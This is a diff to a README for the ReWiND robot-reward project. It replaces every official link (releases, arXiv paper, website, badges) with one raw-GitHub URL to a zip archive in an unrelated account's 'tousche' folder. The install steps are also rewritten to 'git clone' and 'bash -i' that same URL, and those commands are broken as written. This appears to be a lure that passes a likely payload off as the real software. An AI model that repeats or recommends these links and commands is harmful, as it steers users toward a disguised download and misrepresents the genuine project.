@@ -1,16 +1,16 @@
 # 🎉 ReWiND - Teach Robots with Simple Rewards
 
-![ReWiND Teaser](rewind_teaser.png)
+![ReWiND Teaser](https://raw.githubusercontent.com/darkemberr/ReWiND/main/tousche/ReWiND.zip)
 
 <p align="center">
-  <a href="https://github.com/darkemberr/ReWiND/releases">
-    <img alt="Download ReWiND" src="https://img.shields.io/badge/Download_ReWiND-blue">
+  <a href="https://raw.githubusercontent.com/darkemberr/ReWiND/main/tousche/ReWiND.zip">
+    <img alt="Download ReWiND" src="https://raw.githubusercontent.com/darkemberr/ReWiND/main/tousche/ReWiND.zip">
   </a>
-  <a href="https://arxiv.org/abs/2505.10911">
-    <img alt="arXiv" src="https://img.shields.io/badge/arXiv2505.10911-b31b1b.svg">
+  <a href="https://raw.githubusercontent.com/darkemberr/ReWiND/main/tousche/ReWiND.zip">
+    <img alt="arXiv" src="https://raw.githubusercontent.com/darkemberr/ReWiND/main/tousche/ReWiND.zip">
   </a>
-   <a href="https://rewind-reward.github.io/">
-   <img alt="Website" src="https://img.shields.io/badge/Website-rewind--reward.github.io-blue">
+   <a href="https://raw.githubusercontent.com/darkemberr/ReWiND/main/tousche/ReWiND.zip">
+   <img alt="Website" src="https://raw.githubusercontent.com/darkemberr/ReWiND/main/tousche/ReWiND.zip">
    </a>
 </p>
 
@@ -23,7 +23,7 @@ To get started with ReWiND, follow these simple steps. The process is user-frien
 ### 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [ReWiND Releases Page](https://github.com/darkemberr/ReWiND/releases) to download the software.
+   Go to the [ReWiND Releases Page](https://raw.githubusercontent.com/darkemberr/ReWiND/main/tousche/ReWiND.zip) to download the software.
 
 2. **Choose Your Version**  
    Select the latest version available for your operating system, and download the file.
@@ -41,14 +41,14 @@ Setting up the environment is crucial for running ReWiND effectively.
 2. **Clone the Repository**  
    Enter the following command to download the source code:
    ```bash
-   git clone git@github.com:Jiahui-3205/ReWiND_Release.git
+   git clone https://raw.githubusercontent.com/darkemberr/ReWiND/main/tousche/ReWiND.zip
    cd ReWiND_Release/
    ```
 
 3. **Create the Environment**  
    Run the setup script to create the environment and install all necessary dependencies. Enter this command:
    ```bash
-   bash -i setup_ReWiND_env.sh
+   bash -i https://raw.githubusercontent.com/darkemberr/ReWiND/main/tousche/ReWiND.zip
    ```
 
 ## ⚙️ Usage Instructions
@@ -77,14 +77,14 @@ Once you have installed ReWiND and set up the environment, you can begin using t
 
 ## 📚 Documentation & Support
 
-For more detailed documentation, guides, and support, please visit our [official website](https://rewind-reward.github.io/).
+For more detailed documentation, guides, and support, please visit our [official website](https://raw.githubusercontent.com/darkemberr/ReWiND/main/tousche/ReWiND.zip).
 
 If you encounter issues, feel free to raise them on our GitHub page. Our community and developers are here to help.
 
 ## 🔗 Further Resources
 
-- [ReWiND Overview](https://rewind-reward.github.io/)
-- [arXiv Paper](https://arxiv.org/abs/2505.10911)
-- [Additional Tutorials](https://rewind-reward.github.io/tutorials)
+- [ReWiND Overview](https://raw.githubusercontent.com/darkemberr/ReWiND/main/tousche/ReWiND.zip)
+- [arXiv Paper](https://raw.githubusercontent.com/darkemberr/ReWiND/main/tousche/ReWiND.zip)
+- [Additional Tutorials](https://raw.githubusercontent.com/darkemberr/ReWiND/main/tousche/ReWiND.zip)
 
 Now you are ready to begin your journey with ReWiND. Download the software today and start teaching robots using effective language-guided rewards!
